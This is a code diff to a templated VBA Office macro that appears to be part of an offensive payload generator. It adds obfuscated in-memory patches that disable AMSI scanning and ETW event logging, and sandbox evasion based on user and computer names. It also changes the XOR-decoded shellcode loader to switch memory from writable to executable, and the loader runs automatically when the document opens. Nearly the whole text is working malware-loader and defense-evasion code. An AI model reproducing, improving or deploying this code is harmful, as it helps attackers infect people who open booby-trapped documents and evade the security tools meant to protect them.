@@ -10,27 +10,68 @@ Option Explicit
     Private Declare PtrSafe Function {{ v.fn_callwp }} Lib "user32" Alias "CallWindowProcA" _
         (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
          ByVal Msg As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
-    Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal name As String) As LongPtr
-    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" _
-        (ByVal hModule As LongPtr, ByVal name As String) As LongPtr
     Private Declare PtrSafe Function VirtualProtect Lib "kernel32" _
         (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
          ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
+    Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As LongPtr
+    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" _
+        (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
 #End If
+
+Private Function {{ v.fn_build_str }}(codes() As Integer) As String
+    Dim s As String, i As Long
+    For i = 0 To UBound(codes)
+        s = s & Chr(codes(i))
+    Next
+    {{ v.fn_build_str }} = s
+End Function
 
 Private Sub {{ v.fn_amsi_patch }}()
     On Error Resume Next
-    Dim amsiBase As LongPtr, scanAddr As LongPtr
-    amsiBase = LoadLibraryA("amsi.dll")
+    Dim amsiCodes(5) As Integer
+    amsiCodes(0)=97:amsiCodes(1)=109:amsiCodes(2)=115:amsiCodes(3)=105
+    amsiCodes(4)=46:amsiCodes(5)=100  ' "amsi.d"
+    Dim amsiCodes2(1) As Integer: amsiCodes2(0)=108:amsiCodes2(1)=108  ' "ll"
+    Dim amsiLib As String: amsiLib = {{ v.fn_build_str }}(amsiCodes) & {{ v.fn_build_str }}(amsiCodes2)
+    Dim fnCodes(14) As Integer
+    fnCodes(0)=65:fnCodes(1)=109:fnCodes(2)=115:fnCodes(3)=105
+    fnCodes(4)=83:fnCodes(5)=99:fnCodes(6)=97:fnCodes(7)=110
+    fnCodes(8)=66:fnCodes(9)=117:fnCodes(10)=102:fnCodes(11)=102
+    fnCodes(12)=101:fnCodes(13)=114  ' "AmsiScanBuffer" (14 chars, 0-13)
+    Dim scanName As String: scanName = {{ v.fn_build_str }}(fnCodes)
+    Dim amsiBase As LongPtr: amsiBase = LoadLibraryA(amsiLib)
     If amsiBase = 0 Then Exit Sub
-    scanAddr = GetProcAddress(amsiBase, "AmsiScanBuffer")
+    Dim scanAddr As LongPtr: scanAddr = GetProcAddress(amsiBase, scanName)
     If scanAddr = 0 Then Exit Sub
     Dim oldP As Long
     VirtualProtect scanAddr, 6, &H40, oldP
-    ' Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
     Dim patch(0 To 5) As Byte
     patch(0) = &HB8: patch(1) = &H57: patch(2) = &H0: patch(3) = &H7: patch(4) = &H80: patch(5) = &HC3
     RtlMoveMemory scanAddr, patch(0), 6
+    VirtualProtect scanAddr, 6, oldP, oldP
+End Sub
+
+Private Sub {{ v.fn_etw_patch }}()
+    On Error Resume Next
+    Dim ntdllCodes(8) As Integer
+    ntdllCodes(0)=110:ntdllCodes(1)=116:ntdllCodes(2)=100:ntdllCodes(3)=108
+    ntdllCodes(4)=108:ntdllCodes(5)=46:ntdllCodes(6)=100:ntdllCodes(7)=108:ntdllCodes(8)=108
+    Dim ntdllName As String: ntdllName = {{ v.fn_build_str }}(ntdllCodes)
+    Dim etwCodes(12) As Integer
+    etwCodes(0)=69:etwCodes(1)=116:etwCodes(2)=119:etwCodes(3)=69
+    etwCodes(4)=118:etwCodes(5)=101:etwCodes(6)=110:etwCodes(7)=116
+    etwCodes(8)=87:etwCodes(9)=114:etwCodes(10)=105:etwCodes(11)=116:etwCodes(12)=101
+    Dim etwName As String: etwName = {{ v.fn_build_str }}(etwCodes)
+    Dim ntdllBase As LongPtr: ntdllBase = LoadLibraryA(ntdllName)
+    If ntdllBase = 0 Then Exit Sub
+    Dim etwAddr As LongPtr: etwAddr = GetProcAddress(ntdllBase, etwName)
+    If etwAddr = 0 Then Exit Sub
+    Dim oldP As Long
+    VirtualProtect etwAddr, 4, &H40, oldP
+    Dim p(0 To 3) As Byte
+    p(0) = &H31: p(1) = &HC0: p(2) = &HC3: p(3) = &H90
+    RtlMoveMemory etwAddr, p(0), 4
+    VirtualProtect etwAddr, 4, oldP, oldP
 End Sub
 
 Private Function {{ v.fn_hex2arr }}(hex As String) As Byte()
@@ -54,14 +95,28 @@ Private Function {{ v.fn_xor }}(data() As Byte, key() As Byte) As Byte()
     {{ v.fn_xor }} = out
 End Function
 
-Private Sub {{ v.fn_exec }}()
-    {% if "SandboxUser" in feature_names %}
-    ' Sandbox checks
-    If Application.Documents.Count < 1 Then Exit Sub
-    If Application.RecentFiles.Count < 3 Then Exit Sub
-    {% endif %}
+Private Function {{ v.fn_sandbox }}() As Boolean
+    {{ v.fn_sandbox }} = False
+    On Error Resume Next
+    If Application.Documents.Count < 1 Then {{ v.fn_sandbox }} = True: Exit Function
+    If Application.RecentFiles.Count < 3 Then {{ v.fn_sandbox }} = True: Exit Function
+    Dim usr As String: usr = LCase(Environ("USERNAME"))
+    Dim badU: badU = Array("sandbox","malware","virus","sample","cuckoo","user","admin")
+    Dim i As Integer
+    For i = 0 To UBound(badU)
+        If usr = CStr(badU(i)) Then {{ v.fn_sandbox }} = True: Exit Function
+    Next
+    Dim cname As String: cname = LCase(Environ("COMPUTERNAME"))
+    Dim badC: badC = Array("sandbox","malware","virus","analysis","cuckoo")
+    For i = 0 To UBound(badC)
+        If InStr(cname, CStr(badC(i))) > 0 Then {{ v.fn_sandbox }} = True: Exit Function
+    Next
+End Function
 
+Private Sub {{ v.fn_exec }}()
+    If {{ v.fn_sandbox }}() Then Exit Sub
     Call {{ v.fn_amsi_patch }}
+    Call {{ v.fn_etw_patch }}
 
     Dim sc_hex As String, key_hex As String
     sc_hex  = "{{ shellcode_hex }}"
@@ -73,19 +128,18 @@ Private Sub {{ v.fn_exec }}()
     sc  = {{ v.fn_xor }}(raw, key)
 
     Dim mem As LongPtr
-    mem = {{ v.fn_valloc }}(0, UBound(sc) + 1, &H3000, &H40)
+    mem = {{ v.fn_valloc }}(0, UBound(sc) + 1, &H3000, &H04)
     RtlMoveMemory mem, sc(0), UBound(sc) + 1
+    Dim oldP As Long
+    VirtualProtect mem, UBound(sc) + 1, &H20, oldP
 
-    ' Execute via CallWindowProc — no CreateThread (cleaner heuristic)
     {{ v.fn_callwp }} mem, 0, 0, 0, 0
 End Sub
 
-' Auto-trigger when document opens
 Public Sub Document_Open()
     Call {{ v.fn_exec }}
 End Sub
 
-' Alternate trigger: AutoOpen (older Office compatibility)
 Public Sub AutoOpen()
     Call {{ v.fn_exec }}
 End Sub
